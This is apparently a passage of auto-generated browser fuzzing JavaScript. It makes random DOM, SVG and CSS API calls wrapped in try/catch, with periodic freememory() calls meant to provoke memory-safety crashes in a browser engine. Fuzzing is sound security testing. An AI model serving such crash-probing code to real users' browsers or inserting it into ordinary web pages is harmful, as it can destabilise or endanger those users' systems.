try { svgvar00004.setAttribute("max", "1s"); } catch(e) { }
try { svgvar00012.addEventListener("DOMAttrModified", var00021); } catch(e) { }
try { /* newvar{var00164:long} */ var var00164 = htmlvar00027.naturalHeight; } catch(e) { }
try { var00114.setAttribute("ascent", "88"); } catch(e) { }
try { /* newvar{var00165:VideoTrackList} */ var var00165 = var00079.videoTracks; } catch(e) { }
try { if (!var00165) { var00165 = GetVariable(fuzzervars, 'VideoTrackList'); } else { SetVariable(var00165, 'VideoTrackList'); SetVariable(var00165, 'EventTarget');  } } catch(e) { }
try { /* newvar{var00166:Touch} */ var var00166 = document.createTouch(var00001,svgvar00016,-1,0.892492918447,0.634938916044,0.834873056808,0.80464884254,0.11510303355,0.632085627618); } catch(e) { }
try { if (!var00166) { var00166 = GetVariable(fuzzervars, 'Touch'); } else { SetVariable(var00166, 'Touch');  } } catch(e) { }
try { /* newvar{var00167:EventHandler} */ var var00167 = var00001.onrejectionhandled; } catch(e) { }
try { if (!var00167) { var00167 = GetVariable(fuzzervars, 'EventHandler'); } else { SetVariable(var00167, 'EventHandler');  } } catch(e) { }
try { /* newvar{var00168:USVString} */ var var00168 = var00022.pathname; } catch(e) { }
try { if (!var00168) { var00168 = GetVariable(fuzzervars, 'USVString'); } else { SetVariable(var00168, 'USVString');  } } catch(e) { }
try { window.releaseEvents(); } catch(e) { }
try { /* newvar{var00169:DOMString} */ var var00169 = htmlvar00024.useMap; } catch(e) { }
try { var00081.returnValue = false; } catch(e) { }
try { htmlvar00033.name = "" + String.fromCharCode(77, 51, 109, 51, 90, 97, 82, 107, 45, 98, 73, 114, 87, 71, 104, 106, 52, 40, 82, 69) + ""; } catch(e) { }
try { /* newvar{var00171:URLSearchParams} */ var var00171 = var00102.searchParams; } catch(e) { }
try { if (!var00171) { var00171 = GetVariable(fuzzervars, 'URLSearchParams'); } else { SetVariable(var00171, 'URLSearchParams');  } } catch(e) { }
try { /* newvar{var00172:USVString} */ var var00172 = var00022.href; } catch(e) { }
try { if (!var00172) { var00172 = GetVariable(fuzzervars, 'USVString'); } else { SetVariable(var00172, 'USVString');  } } catch(e) { }
try { /* newvar{var00170:boolean} */ var var00170 = var00171.has(var00172); } catch(e) { }
try { /* newvar{var00173:USVString} */ var var00173 = var00005.href; } catch(e) { }
try { if (!var00173) { var00173 = GetVariable(fuzzervars, 'USVString'); } else { SetVariable(var00173, 'USVString');  } } catch(e) { }
try { htmlvar00022.setAttribute("onkeydown", "eventhandler5()"); } catch(e) { }
try { var00064.setAttribute("code", "" + String.fromCharCode(67, 57, 66, 34, 115, 60, 49, 65, 39, 95, 94, 50, 78, 81, 107, 75, 73, 40, 113, 86) + ""); } catch(e) { }
try { svgvar00019.setAttribute("fill", "url(#svgvar00004)"); } catch(e) { }
try { svgvar00025.setAttribute("font-rendering", "optimizeLegibility"); } catch(e) { }
try { var00134.setProperty("-webkit-mask-size", "0px 10px"); } catch(e) { }
try { /* newvar{var00174:Element} */ var var00174 = var00065.focusNode; } catch(e) { }
try { if (!var00174) { var00174 = GetVariable(fuzzervars, 'Element'); } else { SetVariable(var00174, 'Element'); SetVariable(var00174, 'GlobalEventHandlers'); SetVariable(var00174, 'EventTarget');  } } catch(e) { }
try { htmlvar00031.setAttribute("aria-pressed", "false"); } catch(e) { }
try { var00078.defaultMuted = true; } catch(e) { }
try { htmlvar00024.codeType = "image/gif"; } catch(e) { }
try { var00025.setProperty("border-color", "white"); } catch(e) { }
try { /* newvar{var00175:boolean} */ var var00175 = var00049.snapToLines; } catch(e) { }
try { freememory(); } catch(e) { }
try { var00134.setProperty("-webkit-box-decoration-break", "slice"); } catch(e) { }
try { var00025.setProperty("font-feature-settings", "'liga'"); } catch(e) { }
try { svgvar00014.setAttribute("width", "0em"); } catch(e) { }
try { /* newvar{var00176:DOMString} */ var var00176 = var00099.media; } catch(e) { }
try { /* newvar{var00179:HTMLFrameElement} */ var var00179 = document.createElement("frame"); } catch(e) { }
try { if (!var00179) { var00179 = GetVariable(fuzzervars, 'HTMLFrameElement'); } else { SetVariable(var00179, 'HTMLFrameElement'); SetVariable(var00179, 'Element'); SetVariable(var00179, 'GlobalEventHandlers'); SetVariable(var00179, 'EventTarget');  } } catch(e) { }
try { /* newvar{var00178:Window} */ var var00178 = var00179.contentWindow; } catch(e) { }
try { if (!var00178) { var00178 = GetVariable(fuzzervars, 'Window'); } else { SetVariable(var00178, 'Window'); SetVariable(var00178, 'GlobalEventHandlers'); SetVariable(var00178, 'WindowBase64'); SetVariable(var00178, 'WindowEventHandlers'); SetVariable(var00178, 'WindowTimers'); SetVariable(var00178, 'EventTarget');  } } catch(e) { }
try { /* newvar{var00177:long} */ var var00177 = var00178.screenX; } catch(e) { }
try { htmlvar00038.focus(); } catch(e) { }
try { var00020.setProperty("-webkit-mask-clip", "border-box"); } catch(e) { }
try { htmlvar00006.ontimeupdate = var00083; } catch(e) { }
try { /* newvar{var00180:DocumentFragment} */ var var00180 = var00036.cloneContents(); } catch(e) { }
try { if (!var00180) { var00180 = GetVariable(fuzzervars, 'DocumentFragment'); } else { SetVariable(var00180, 'DocumentFragment'); SetVariable(var00180, 'Element'); SetVariable(var00180, 'GlobalEventHandlers'); SetVariable(var00180, 'EventTarget');  } } catch(e) { }
try { /* newvar{var00181:DOMString} */ var var00181 = document.fgColor; } catch(e) { }
try { var00134.setProperty("grid", "max-content/max-content"); } catch(e) { }
try { var00099.setAttribute("aria-name", "" + String.fromCharCode(56, 102, 93, 124, 106, 44, 65, 52, 40, 81, 57, 65, 97, 67, 66, 95, 69, 47, 79, 87) + ""); } catch(e) { }
try { /* newvar{var00182:boolean} */ var var00182 = htmlvar00011.hasAttribute("aria-valuetext"); } catch(e) { }
try { var00025.setProperty("mso-border-alt", "solid black .1pt"); } catch(e) { }
try { /* newvar{var00183:EventHandler} */ var var00183 = htmlvar00021.onerror; } catch(e) { }
try { if (!var00183) { var00183 = GetVariable(fuzzervars, 'EventHandler'); } else { SetVariable(var00183, 'EventHandler');  } } catch(e) { }
try { /* newvar{var00184:DOMString} */ var var00184 = document.domain; } catch(e) { }
try { htmlvar00012.max = 0.939563727177; } catch(e) { }
try { var00161.setAttribute("loop", "1"); } catch(e) { }
try { /* newvar{var00186:VisualViewport} */ var var00186 = window.visualViewport; } catch(e) { }
try { if (!var00186) { var00186 = GetVariable(fuzzervars, 'VisualViewport'); } else { SetVariable(var00186, 'VisualViewport'); SetVariable(var00186, 'EventTarget');  } } catch(e) { }
try { /* newvar{var00185:double} */ var var00185 = var00186.clientHeight; } catch(e) { }
try { htmlvar00027.setAttribute("inputmode", "latin-name"); } catch(e) { }
try { /* newvar{var00187:BarProp} */ var var00187 = var00178.statusbar; } catch(e) { }
try { if (!var00187) { var00187 = GetVariable(fuzzervars, 'BarProp'); } else { SetVariable(var00187, 'BarProp');  } } catch(e) { }
try { var00075.requestPointerLock(); } catch(e) { }
try { var00025.setProperty("fill-opacity", "0.377046243954"); } catch(e) { }
try { var00064.scrollIntoView(false); } catch(e) { }
try { /* newvar{var00188:Element} */ var var00188 = htmlvar00001; } catch(e) { }
try { if (!var00188) { var00188 = GetVariable(fuzzervars, 'Element'); } else { SetVariable(var00188, 'Element'); SetVariable(var00188, 'GlobalEventHandlers'); SetVariable(var00188, 'EventTarget');  } } catch(e) { }
try { /* newvar{var00189:EventHandler} */ var var00189 = htmlvar00024.onkeypress; } catch(e) { }
try { if (!var00189) { var00189 = GetVariable(fuzzervars, 'EventHandler'); } else { SetVariable(var00189, 'EventHandler');  } } catch(e) { }
try { /* newvar{var00190:boolean} */ var var00190 = document.execCommand("foreColor", false, ""); } catch(e) { }
try { htmlvar00027.align = "RIGHT"; } catch(e) { }
try { var00099.setAttribute("onseeked", "eventhandler1()"); } catch(e) { }
try { var00040.setAttribute("underline-position", "1"); } catch(e) { }
try { var00114.setAttribute("exponent", "0.214814372715"); } catch(e) { }
try { freememory(); } catch(e) { }
try { freememory(); } catch(e) { }
try { var00134.setProperty("-webkit-box-reflect", "right 0px"); } catch(e) { }
try { /* newvar{var00191:Element} */ var var00191 = htmlvar00029; } catch(e) { }
try { if (!var00191) { var00191 = GetVariable(fuzzervars, 'Element'); } else { SetVariable(var00191, 'Element'); SetVariable(var00191, 'GlobalEventHandlers'); SetVariable(var00191, 'EventTarget');  } } catch(e) { }
try { /* newvar{var00192:DOMString} */ var var00192 = htmlvar00028.src; } catch(e) { }
try { var00075.replaceWith(htmlvar00034); } catch(e) { }
try { /* newvar{var00193:HTMLFrameSetElement} */ var var00193 = document.createElement("frameset"); } catch(e) { }
try { if (!var00193) { var00193 = GetVariable(fuzzervars, 'HTMLFrameSetElement'); } else { SetVariable(var00193, 'HTMLFrameSetElement'); SetVariable(var00193, 'WindowEventHandlers'); SetVariable(var00193, 'Element'); SetVariable(var00193, 'GlobalEventHandlers'); SetVariable(var00193, 'EventTarget');  } } catch(e) { }
try { var00193.onorientationchange = var00083; } catch(e) { }
try { /* newvar{var00194:DOMString} */ var var00194 = document.URL; } catch(e) { }
try { /* newvar{var00195:boolean} */ var var00195 = document.execCommand("forwardDelete", false); } catch(e) { }
try { var00113.clear(); } catch(e) { }
try { var00158.setAttribute("spellcheck", "false"); } catch(e) { }
try { /* newvar{var00196:EventHandler} */ var var00196 = var00153.onclose; } catch(e) { }
try { if (!var00196) { var00196 = GetVariable(fuzzervars, 'EventHandler'); } else { SetVariable(var00196, 'EventHandler');  } } catch(e) { }
try { svgvar00001.setAttribute("font-variant", "small-caps"); } catch(e) { }
try { var00020.setProperty("mso-style-id", "1"); } catch(e) { }
try { var00001.releaseEvents(); } catch(e) { }
try { /* newvar{var00200:SVGPoint} */ var var00200 = svgvar00001.currentTranslate; } catch(e) { }
try { if (!var00200) { var00200 = GetVariable(fuzzervars, 'SVGPoint'); } else { SetVariable(var00200, 'SVGPoint');  } } catch(e) { }
try { /* newvar{var00199:SVGPoint} */ var var00199 = var00113.appendItem(var00200); } catch(e) { }
try { if (!var00199) { var00199 = GetVariable(fuzzervars, 'SVGPoint'); } else { SetVariable(var00199, 'SVGPoint');  } } catch(e) { }
try { /* newvar{var00198:SVGPoint} */ var var00198 = var00113.insertItemBefore(var00199,1); } catch(e) { }
try { if (!var00198) { var00198 = GetVariable(fuzzervars, 'SVGPoint'); } else { SetVariable(var00198, 'SVGPoint');  } } catch(e) { }
try { /* newvar{var00197:SVGPoint} */ var var00197 = var00113.initialize(var00198); } catch(e) { }
try { if (!var00197) { var00197 = GetVariable(fuzzervars, 'SVGPoint'); } else { SetVariable(var00197, 'SVGPoint');  } } catch(e) { }
try { /* newvar{var00201:CSSStyleDeclaration} */ var var00201 = var00161.style; } catch(e) { }
try { if (!var00201) { var00201 = GetVariable(fuzzervars, 'CSSStyleDeclaration'); } else { SetVariable(var00201, 'CSSStyleDeclaration');  } } catch(e) { }
try { var00201.setProperty("writing-mode", "inherit"); } catch(e) { }
try { /* newvar{var00202:URLSearchParams} */ var var00202 = var00102.searchParams; } catch(e) { }
try { if (!var00202) { var00202 = GetVariable(fuzzervars, 'URLSearchParams'); } else { SetVariable(var00202, 'URLSearchParams');  } } catch(e) { }
try { /* newvar{var00203:EventHandler} */ var var00203 = svgvar00002.onwheel; } catch(e) { }
try { if (!var00203) { var00203 = GetVariable(fuzzervars, 'EventHandler'); } else { SetVariable(var00203, 'EventHandler');  } } catch(e) { }
try { var00082.baseVal = String.fromCodePoint(43276, 627195, 557267, 616953, 390469, 680488, 256554, 1038640, 680357, 68426, 812407, 1060349, 778353, 783643, 742059, 933772, 993838, 835052, 226700, 35795); } catch(e) { }
try { var00179.setAttribute("formtarget", "htmlvar00001"); } catch(e) { }
try { var00040.setAttribute("startOffset", "0"); } catch(e) { }
try { document.all[32%document.all.length].appendChild(htmlvar00038); } catch(e) { }
try { htmlvar00013.setAttribute("scheme", "NIST"); } catch(e) { }
try { /* newvar{var00204:long} */ var var00204 = htmlvar00020.minLength; } catch(e) { }
try { /* newvar{var00205:EventHandler} */ var var00205 = svgvar00014.onpointermove; } catch(e) { }
try { if (!var00205) { var00205 = GetVariable(fuzzervars, 'EventHandler'); } else { SetVariable(var00205, 'EventHandler');  } } catch(e) { }
try { var00201.setProperty("clear", "right"); } catch(e) { }
try { /* newvar{var00206:SVGAnimatedLengthList} */ var var00206 = svgvar00018.dy; } catch(e) { }
try { if (!var00206) { var00206 = GetVariable(fuzzervars, 'SVGAnimatedLengthList'); } else { SetVariable(var00206, 'SVGAnimatedLengthList');  } } catch(e) { }
try { var00020.setProperty("word-break", "normal"); } catch(e) { }
try { /* newvar{var00207:NodeList} */ var var00207 = var00079.querySelectorAll("#htmlvar00005 #htmlvar00002"); } catch(e) { }
try { if (!var00207) { var00207 = GetVariable(fuzzervars, 'NodeList'); } else { SetVariable(var00207, 'NodeList');  } } catch(e) { }
try { htmlvar00020.setAttribute("nohref", "nohref"); } catch(e) { }
try { /* newvar{var00208:boolean} */ var var00208 = var00041.contains(String.fromCodePoint(849630, 1063036, 181111, 70787, 542627, 566233, 628126, 975161, 608502, 1103319, 502021, 1047436, 4509, 109888, 583844, 761207, 726753, 676077, 175143, 858584)); } catch(e) { }
try { /* newvar{var00209:Element} */ var var00209 = var00036.commonAncestorContainer; } catch(e) { }
try { if (!var00209) { var00209 = GetVariable(fuzzervars, 'Element'); } else { SetVariable(var00209, 'Element'); SetVariable(var00209, 'GlobalEventHandlers'); SetVariable(var00209, 'EventTarget');  } } catch(e) { }
try { /* newvar{var00210:SVGAnimatedEnumeration} */ var var00210 = svgvar00016.spreadMethod; } catch(e) { }
try { if (!var00210) { var00210 = GetVariable(fuzzervars, 'SVGAnimatedEnumeration'); } else { SetVariable(var00210, 'SVGAnimatedEnumeration');  } } catch(e) { }
try { var00023.click(); } catch(e) { }
try { document.onfullscreenerror = var00196; } catch(e) { }
try { /* newvar{var00211:SVGAnimatedLength} */ var var00211 = svgvar00019.height; } catch(e) { }
try { if (!var00211) { var00211 = GetVariable(fuzzervars, 'SVGAnimatedLength'); } else { SetVariable(var00211, 'SVGAnimatedLength');  } } catch(e) { }
try { var00081.initMutationEvent(String.fromCodePoint(227537, 765847, 1089571, 629798, 889499, 310172, 96593, 201503, 1039628, 543513, 830053, 240610, 725287, 36649, 873702, 975314, 767563, 857900, 719574, 1069185),true,true,htmlvar00015,"1","htmlvar00003","1"); } catch(e) { }
try { htmlvar00020.setAttribute("ontimeupdate", "eventhandler4()"); } catch(e) { }
try { /* newvar{var00212:EventHandler} */ var var00212 = var00037.onselect; } catch(e) { }
try { if (!var00212) { var00212 = GetVariable(fuzzervars, 'EventHandler'); } else { SetVariable(var00212, 'EventHandler');  } } catch(e) { }
try { /* newvar{var00213:long} */ var var00213 = var00078.webkitAudioDecodedByteCount; } catch(e) { }
try { svgvar00019.setAttribute("end", "svgvar00001.repeat(0)"); } catch(e) { }
try { var00180.setAttribute("onresize", "eventhandler4()"); } catch(e) { }
try { var00201.setProperty("word-break", "solid"); } catch(e) { }
try { svgvar00003.setAttribute("lighting-color", "WindowFrame"); } catch(e) { }
try { htmlvar00021.setAttribute("formenctype", "text/plain"); } catch(e) { }
try { svgvar00019.setAttribute("order", "1 0"); } catch(e) { }
try { /* newvar{var00214:HTMLFormElement} */ var var00214 = htmlvar00024.form; } catch(e) { }
try { if (!var00214) { var00214 = GetVariable(fuzzervars, 'HTMLFormElement'); } else { SetVariable(var00214, 'HTMLFormElement'); SetVariable(var00214, 'Element'); SetVariable(var00214, 'GlobalEventHandlers'); SetVariable(var00214, 'EventTarget');  } } catch(e) { }
try { /* newvar{var00215:DOMString} */ var var00215 = htmlvar00005.ch; } catch(e) { }
try { /* newvar{var00216:SVGElement} */ var var00216 = svgvar00023; } catch(e) { }
try { if (!var00216) { var00216 = GetVariable(fuzzervars, 'SVGElement'); } else { SetVariable(var00216, 'SVGElement'); SetVariable(var00216, 'GlobalEventHandlers'); SetVariable(var00216, 'EventTarget'); SetVariable(var00216, 'GlobalEventHandlers');  } } catch(e) { }
try { htmlvar00026.setAttribute("onmouseenter", "eventhandler2()"); } catch(e) { }
try { var00102.hash = var00168; } catch(e) { }
try { /* newvar{var00217:double} */ var var00217 = htmlvar00012.position; } catch(e) { }
try { var00134.setProperty("text-underline", "single"); } catch(e) { }
try { var00086.setProperty("shape-margin", "0em"); } catch(e) { }
try { var00134.setProperty("-webkit-flex-wrap", "wrap-reverse"); } catch(e) { }
try { var00201.setProperty("mso-style-next", "Normal"); } catch(e) { }
try { var00138.setProperty("-webkit-transform", "rotate(1deg)"); } catch(e) { }
try { /* newvar{var00218:DOMString} */ var var00218 = var00153.textContent; } catch(e) { }
try { /* newvar{var00219:EventTarget} */ var var00219 = var00117; } catch(e) { }
try { if (!var00219) { var00219 = GetVariable(fuzzervars, 'EventTarget'); } else { SetVariable(var00219, 'EventTarget');  } } catch(e) { }
try { var00020.setProperty("fill", "rgb(160,187,63)"); } catch(e) { }
try { document.all[76%document.all.length].appendChild(htmlvar00014); } catch(e) { }
try { var00065.addRange(var00036); } catch(e) { }
try { var00040.setAttribute("font-size", "1"); } catch(e) { }
try { /* newvar{var00220:boolean} */ var var00220 = var00137.disabled; } catch(e) { }
try { var00193.cols = "-1,-1"; } catch(e) { }
try { window.onstorage = var00144; } catch(e) { }
try { svgvar00009.before(var00095); } catch(e) { }
try { /* newvar{var00221:DOMString} */ var var00221 = htmlvar00014.charset; } catch(e) { }
try { htmlvar00020.selectionEnd = -1; } catch(e) { }
try { htmlvar00025.setAttribute("oncut", "eventhandler4()"); } catch(e) { }
try { /* newvar{var00222:EventHandler} */ var var00222 = var00117.onloading; } catch(e) { }
try { if (!var00222) { var00222 = GetVariable(fuzzervars, 'EventHandler'); } else { SetVariable(var00222, 'EventHandler');  } } catch(e) { }
try { /* newvar{var00224:HTMLSelectElement} */ var var00224 = document.createElement("select"); } catch(e) { }
try { if (!var00224) { var00224 = GetVariable(fuzzervars, 'HTMLSelectElement'); } else { SetVariable(var00224, 'HTMLSelectElement'); SetVariable(var00224, 'Element'); SetVariable(var00224, 'GlobalEventHandlers'); SetVariable(var00224, 'EventTarget');  } } catch(e) { }
try { /* newvar{var00223:HTMLOptionsCollection} */ var var00223 = var00224.options; } catch(e) { }
try { if (!var00223) { var00223 = GetVariable(fuzzervars, 'HTMLOptionsCollection'); } else { SetVariable(var00223, 'HTMLOptionsCollection'); SetVariable(var00223, 'HTMLCollection');  } } catch(e) { }
try { var00223.add(var00153,0); } catch(e) { }
try { var00134.setProperty("font-style", "none"); } catch(e) { }
try { var00201.setProperty("shape-margin", "1"); } catch(e) { }
try { /* newvar{var00225:USVString} */ var var00225 = var00022.host; } catch(e) { }
try { if (!var00225) { var00225 = GetVariable(fuzzervars, 'USVString'); } else { SetVariable(var00225, 'USVString');  } } catch(e) { }
try { htmlvar00006.deleteCell(1); } catch(e) { }
try { svgvar00001.forceRedraw(); } catch(e) { }
try { var00134.setProperty("content", "counter(c, upper-alpha)"); } catch(e) { }
try { /* newvar{var00226:EventTarget} */ var var00226 = var00178; } catch(e) { }
try { if (!var00226) { var00226 = GetVariable(fuzzervars, 'EventTarget'); } else { SetVariable(var00226, 'EventTarget');  } } catch(e) { }
try { htmlvar00020.selectionStart = 1; } catch(e) { }
try { var00134.setProperty("mso-ignore", "padding"); } catch(e) { }
try { htmlvar00014.disabled = false; } catch(e) { }
try { var00024.setAttribute("href", "" + String.fromCharCode(57, 57, 121, 55, 32, 59, 122, 69, 90, 58, 110, 75, 68, 78, 123, 108, 91, 56, 122, 89) + ""); } catch(e) { }
try { var00020.setProperty("font-feature-settings", "'frac' 42, 'dlig' 1"); } catch(e) { }
try { htmlvar00010.setAttribute("onpagehide", "eventhandler1()"); } catch(e) { }
try { htmlvar00017.noWrap = false; } catch(e) { }
try { svgvar00024.setAttribute("baseProfile", "tiny"); } catch(e) { }
try { svgvar00027.onbeforecut = var00028; } catch(e) { }
try { /* newvar{var00227:long} */ var var00227 = var00064.loop; } catch(e) { }
try { svgvar00005.setAttribute("filterRes", "93"); } catch(e) { }
try { var00053.onmouseover = var00028; } catch(e) { }
try { var00086.setProperty("offset", "path('M 1 9 l 42 69') 82% auto 5deg"); } catch(e) { }
try { /* newvar{var00228:DOMString} */ var var00228 = htmlvar00008.chOff; } catch(e) { }
try { var00138.setProperty("-webkit-border-image", "url(data:image/gif;base64,R0lGODlhEAAQAMQAAORHHOVSKudfOulrSOp3WOyDZu6QdvCchPGolfO0o/XBs/fNwfjZ0frl3/zy7////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAkAABAALAAAAAAQABAAAAVVICSOZGlCQAosJ6mu7fiyZeKqNKToQGDsM8hBADgUXoGAiqhSvp5QAnQKGIgUhwFUYLCVDFCrKUE1lBavAViFIDlTImbKC5Gm2hB0SlBCBMQiB0UjIQA7) 0 0 1 0"); } catch(e) { }
try { /* newvar{var00229:HTMLHyperlinkElementUtils} */ var var00229 = var00005; } catch(e) { }
try { if (!var00229) { var00229 = GetVariable(fuzzervars, 'HTMLHyperlinkElementUtils'); } else { SetVariable(var00229, 'HTMLHyperlinkElementUtils');  } } catch(e) { }
try { /* newvar{var00230:SVGAnimatedString} */ var var00230 = var00040.in1; } catch(e) { }
try { if (!var00230) { var00230 = GetVariable(fuzzervars, 'SVGAnimatedString'); } else { SetVariable(var00230, 'SVGAnimatedString');  } } catch(e) { }
try { /* newvar{var00232:HTMLOptionElement} */ var var00232 = var00224.item(59%var00224.length); } catch(e) { }
try { if (!var00232) { var00232 = GetVariable(fuzzervars, 'HTMLOptionElement'); } else { SetVariable(var00232, 'HTMLOptionElement'); SetVariable(var00232, 'Element'); SetVariable(var00232, 'GlobalEventHandlers'); SetVariable(var00232, 'EventTarget');  } } catch(e) { }
try { /* newvar{var00231:Element} */ var var00231 = var00232; } catch(e) { }
try { if (!var00231) { var00231 = GetVariable(fuzzervars, 'Element'); } else { SetVariable(var00231, 'Element'); SetVariable(var00231, 'GlobalEventHandlers'); SetVariable(var00231, 'EventTarget');  } } catch(e) { }
try { /* newvar{var00233:boolean} */ var var00233 = document.execCommand("justifyFull", false); } catch(e) { }
try { /* newvar{var00234:DOMString} */ var var00234 = htmlvar00004.cellSpacing; } catch(e) { }
try { /* newvar{var00235:EventHandler} */ var var00235 = var00161.ontouchstart; } catch(e) { }
try { if (!var00235) { var00235 = GetVariable(fuzzervars, 'EventHandler'); } else { SetVariable(var00235, 'EventHandler');  } } catch(e) { }
try { var00153.setAttribute("onchange", "eventhandler5()"); } catch(e) { }
try { var00025.setProperty("break-after", "avoid"); } catch(e) { }
try { var00216.setAttribute("overflow", "visible"); } catch(e) { }
try { htmlvar00024.standby = "" + String.fromCharCode(37, 68, 73, 33, 49, 120, 64, 57, 118, 47, 69, 51, 64, 53, 38, 76, 94, 118, 103, 89) + ""; } catch(e) { }
try { htmlvar00004.cellSpacing = "83"; } catch(e) { }
try { var00001.onoffline = var00091; } catch(e) { }
try { var00079.setAttribute("inner", "1"); } catch(e) { }
try { var00201.setProperty("offset", "path('M 0 0 h 1 v -1') 1px -1rad"); } catch(e) { }
try { /* newvar{var00236:Element} */ var var00236 = htmlvar00024["foo"]; } catch(e) { }
try { if (!var00236) { var00236 = GetVariable(fuzzervars, 'Element'); } else { SetVariable(var00236, 'Element'); SetVariable(var00236, 'GlobalEventHandlers'); SetVariable(var00236, 'EventTarget');  } } catch(e) { }
try { var00001.defaultstatus = "htmlvar00005"; } catch(e) { }
try { /* newvar{var00237:HTMLCollection} */ var var00237 = document.applets; } catch(e) { }
try { if (!var00237) { var00237 = GetVariable(fuzzervars, 'HTMLCollection'); } else { SetVariable(var00237, 'HTMLCollection');  } } catch(e) { }
try { htmlvar00033.disabled = false; } catch(e) { }
try { /* newvar{var00238:boolean} */ var var00238 = document.execCommand("insertImage", false, "#foo"); } catch(e) { }
try { /* newvar{var00239:DOMString} */ var var00239 = document.alinkColor; } catch(e) { }
try { /* newvar{var00240:double} */ var var00240 = var00054.numberValue; } catch(e) { }
try { var00041.add("foo"); } catch(e) { }
try { /* newvar{var00241:SVGElement} */ var var00241 = svgvar00007; } catch(e) { }
try { if (!var00241) { var00241 = GetVariable(fuzzervars, 'SVGElement'); } else { SetVariable(var00241, 'SVGElement'); SetVariable(var00241, 'GlobalEventHandlers'); SetVariable(var00241, 'EventTarget'); SetVariable(var00241, 'GlobalEventHandlers');  } } catch(e) { }
try { var00186.addEventListener("play",var00021); } catch(e) { }
try { var00201.setProperty("outline-offset", "-1px"); } catch(e) { }
try { svgvar00019.setAttribute("viewbox", "1 -1 -1 1"); } catch(e) { }
try { /* newvar{var00242:EventHandler} */ var var00242 = var00110.onprogress; } catch(e) { }
try { if (!var00242) { var00242 = GetVariable(fuzzervars, 'EventHandler'); } else { SetVariable(var00242, 'EventHandler');  } } catch(e) { }
try { var00232.setAttribute("low", "1"); } catch(e) { }
try { var00134.setProperty("line-height", "normal"); } catch(e) { }
try { var00025.setProperty("prince-hyphens", "auto"); } catch(e) { }
try { htmlvar00016.onwebkitfullscreenerror = var00212; } catch(e) { }
try { /* newvar{var00243:double} */ var var00243 = var00186.clientWidth; } catch(e) { }
try { htmlvar00025.name = "" + String.fromCharCode(68, 48, 105, 98, 82, 120, 125, 104, 112, 85, 36, 123, 67, 55, 93, 125, 99, 103, 81, 85) + ""; } catch(e) { }
try { var00018.type = "application/x-javascript"; } catch(e) { }
try { /* newvar{var00244:long} */ var var00244 = htmlvar00008.rowSpan; } catch(e) { }
try { var00025.setProperty("box-flex", "0"); } catch(e) { }
try { var00138.setProperty("border-bottom-style", "dashed"); } catch(e) { }
try { /* newvar{var00245:DOMString} */ var var00245 = htmlvar00014.hreflang; } catch(e) { }
try { /* newvar{var00246:DOMString} */ var var00246 = document.preferredStylesheetSet; } catch(e) { }
try { var00005.setAttribute("translate", "no"); } catch(e) { }
try { /* newvar{var00247:SVGMatrix} */ var var00247 = svgvar00027.getScreenCTM(); } catch(e) { }
try { if (!var00247) { var00247 = GetVariable(fuzzervars, 'SVGMatrix'); } else { SetVariable(var00247, 'SVGMatrix');  } } catch(e) { }
try { htmlvar00035.chOff = String.fromCodePoint(470084, 716186, 454869, 932643, 711624, 396517, 950448, 121919, 290774, 26278, 575782, 792976, 787105, 276644, 2393, 782323, 836715, 298539, 180644, 1109199); } catch(e) { }
try { /* newvar{var00248:SVGGradientElement} */ var var00248 = svgvar00024; } catch(e) { }
try { if (!var00248) { var00248 = GetVariable(fuzzervars, 'SVGGradientElement'); } else { SetVariable(var00248, 'SVGGradientElement'); SetVariable(var00248, 'SVGURIReference'); SetVariable(var00248, 'SVGElement'); SetVariable(var00248, 'GlobalEventHandlers'); SetVariable(var00248, 'EventTarget'); SetVariable(var00248, 'GlobalEventHandlers');  } } catch(e) { }
try { var00040.setAttribute("edgeMode", "none"); } catch(e) { }
try { /* newvar{var00249:AutoKeyword} */ var var00249 = var00049.position; } catch(e) { }
try { if (!var00249) { var00249 = GetVariable(fuzzervars, 'AutoKeyword'); } else { SetVariable(var00249, 'AutoKeyword');  } } catch(e) { }
try { var00019.innerHTML = var00118; } catch(e) { }
try { /* newvar{var00250:SVGGradientElement} */ var var00250 = svgvar00016; } catch(e) { }
try { if (!var00250) { var00250 = GetVariable(fuzzervars, 'SVGGradientElement'); } else { SetVariable(var00250, 'SVGGradientElement'); SetVariable(var00250, 'SVGURIReference'); SetVariable(var00250, 'SVGElement'); SetVariable(var00250, 'GlobalEventHandlers'); SetVariable(var00250, 'EventTarget'); SetVariable(var00250, 'GlobalEventHandlers');  } } catch(e) { }
try { var00201.setProperty("grid", "none"); } catch(e) { }
try { var00086.setProperty("-webkit-appearance", "meter"); } catch(e) { }
try { /* newvar{var00252:SVGMarkerElement} */ var var00252 = document.createElementNS("http://www.w3.org/2000/svg", "marker"); } catch(e) { }
try { if (!var00252) { var00252 = GetVariable(fuzzervars, 'SVGMarkerElement'); } else { SetVariable(var00252, 'SVGMarkerElement'); SetVariable(var00252, 'SVGFitToViewBox'); SetVariable(var00252, 'SVGElement'); SetVariable(var00252, 'GlobalEventHandlers'); SetVariable(var00252, 'EventTarget'); SetVariable(var00252, 'GlobalEventHandlers');  } } catch(e) { }
try { /* newvar{var00251:svg_url_marker} */ var var00251 = "url(#" + var00252.id + ")"; } catch(e) { }
try { if (!var00251) { var00251 = GetVariable(fuzzervars, 'svg_url_marker'); } else { SetVariable(var00251, 'svg_url_marker');  } } catch(e) { }
try { svgvar00005.setAttribute("marker-mid", var00251); } catch(e) { }
try { htmlvar00024.setAttribute("ondrop", "eventhandler5()"); } catch(e) { }
try { /* newvar{var00253:double} */ var var00253 = var00059.deltaZ; } catch(e) { }
try { svgvar00006.setAttribute("attributeName", "width"); } catch(e) { }
try { var00020.setProperty("offset-rotation", "reverse"); } catch(e) { }
try { /* newvar{var00254:EventHandler} */ var var00254 = svgvar00012.onbegin; } catch(e) { }
try { if (!var00254) { var00254 = GetVariable(fuzzervars, 'EventHandler'); } else { SetVariable(var00254, 'EventHandler');  } } catch(e) { }
try { /* newvar{var00255:EventListener} */ var var00255 = var00010; } catch(e) { }
try { if (!var00255) { var00255 = GetVariable(fuzzervars, 'EventListener'); } else { SetVariable(var00255, 'EventListener');  } } catch(e) { }
try { var00019.addEventListener("DOMNodeInserted", var00255); } catch(e) { }
try { htmlvar00016.setAttribute("onbeforeunload", "eventhandler1()"); } catch(e) { }
try { /* newvar{var00256:Element} */ var var00256 = htmlvar00025; } catch(e) { }
try { if (!var00256) { var00256 = GetVariable(fuzzervars, 'Element'); } else { SetVariable(var00256, 'Element'); SetVariable(var00256, 'GlobalEventHandlers'); SetVariable(var00256, 'EventTarget');  } } catch(e) { }
